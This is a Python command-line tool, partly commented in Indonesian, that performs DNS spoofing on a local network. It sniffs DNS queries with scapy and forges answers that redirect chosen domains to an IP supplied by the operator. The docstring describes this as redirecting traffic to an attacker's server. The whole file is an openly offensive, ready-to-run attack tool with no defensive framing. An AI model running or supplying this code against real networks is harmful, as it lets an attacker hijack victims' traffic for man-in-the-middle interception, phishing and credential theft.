#!/usr/bin/env python3
"""
DNS Spoofer - DNS response spoofing for MITM
Mengeksploitasi DNS untuk redirect traffic ke server attacker.
Usage: sudo python dns_spoofer.py -i eth0 -d example.com -r 192.168.1.100
"""
import argparse
import sys
import os
import threading
import time
import re


def check_root():
    if os.name == "posix" and os.geteuid() != 0:
        print("[!] Requires root privileges")
        return False
    return True


def parse_dns_name(data):
    """Parse DNS name from packet data"""
    dns_name = []
    i = 12
    while i < len(data) and data[i] != 0:
        length = data[i]
        if length == 0:
            break
        i += 1
        if i + length > len(data):
            return ""
        dns_name.append(data[i:i+length].decode("utf-8", errors="ignore"))
        i += length
    return ".".join(dns_name)


def build_dns_response(query_data, redirect_ip, original_name):
    """Build a fake DNS response"""
    # Transaction ID from query
    txid = query_data[:2]
    # Standard query response, no error
    flags = b"\x81\x80"
    # Questions: 1, Answers: 1, Authority: 0, Additional: 0
    counts = b"\x00\x01\x00\x01\x00\x00\x00\x00"
    # Question section (copy from query)
    question_end = 12
    while question_end < len(query_data) and query_data[question_end] != 0:
        question_end += 1 + query_data[question_end]
    question_end += 5  # null + type + class
    question = query_data[12:question_end]

    # Answer: pointer to name, type A, class IN, TTL 300, RDLENGTH 4, RDATA
    answer = b"\xc0\x0c"  # pointer
    answer += b"\x00\x01"  # type A
    answer += b"\x00\x01"  # class IN
    answer += b"\x00\x00\x01\x2c"  # TTL 300
    answer += b"\x00\x04"  # RDLENGTH
    answer += bytes(int(x) for x in redirect_ip.split("."))

    return txid + flags + counts + question + answer


def sniff_dns_and_spoof(interface, redirect_map, verbose=True):
    """Sniff DNS queries and send spoofed responses"""
    try:
        from scapy.all import sniff, UDP, IP, DNS, DNSQR, DNSRR, sendp
    except ImportError:
        print("[!] scapy not installed. Run: pip install scapy")
        return

    def handle_packet(pkt):
        if not pkt.haslayer(DNSQR):
            return

        dns_query = pkt[DNSQR]
        domain = dns_query.qname.decode("utf-8", errors="ignore").rstrip(".")

        # Check if this domain should be redirected
        for target_domain, redirect_ip in redirect_map.items():
            if target_domain in domain:
                if verbose:
                    print(f"[*] DNS Query for: {domain} -> Redirecting to {redirect_ip}")

                # Build spoofed response
                dns_layer = pkt[DNS]
                query_data = bytes(dns_layer)

                # Create response
                spoofed = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
                          UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
                          DNS(
                              id=dns_layer.id,
                              qr=1,
                              aa=1,
                              qd=dns_layer.qd,
                              an=DNSRR(rrname=dns_query.qname, rdata=redirect_ip, ttl=300)
                          )

                sendp(spoofed, iface=interface, verbose=False)
                if verbose:
                    print(f"[+] Sent spoofed response: {domain} -> {redirect_ip}")
                break

    print(f"[*] Sniffing on {interface}")
    sniff(iface=interface, prn=handle_packet, filter="udp port 53", store=False)


def main():
    parser = argparse.ArgumentParser(description="DNS Spoofer for MITM")
    parser.add_argument("-i", "--interface", required=True, help="Network interface")
    parser.add_argument("-d", "--domain", action="append", help="Domain to spoof (can be used multiple times)")
    parser.add_argument("-r", "--redirect", action="append", help="Redirect IP for each domain (in same order)")
    parser.add_argument("-f", "--file", help="File with domain:ip lines")
    args = parser.parse_args()

    if not check_root():
        sys.exit(1)

    redirect_map = {}

    if args.file:
        try:
            with open(args.file) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#") and ":" in line:
                        domain, ip = line.split(":", 1)
                        redirect_map[domain.strip()] = ip.strip()
        except FileNotFoundError:
            print(f"[!] File not found: {args.file}")

    if args.domain and args.redirect:
        if len(args.domain) != len(args.redirect):
            print("[!] Domain dan redirect harus jumlah sama")
            sys.exit(1)
        for d, r in zip(args.domain, args.redirect):
            redirect_map[d] = r

    if not redirect_map:
        print("[!] Butuh minimal 1 domain-redirect mapping")
        sys.exit(1)

    print(f"[*] Redirect map: {redirect_map}")
    print("[*] Starting DNS spoofer... (Ctrl+C to stop)")
    sniff_dns_and_spoof(args.interface, redirect_map)


if __name__ == "__main__":
    main()

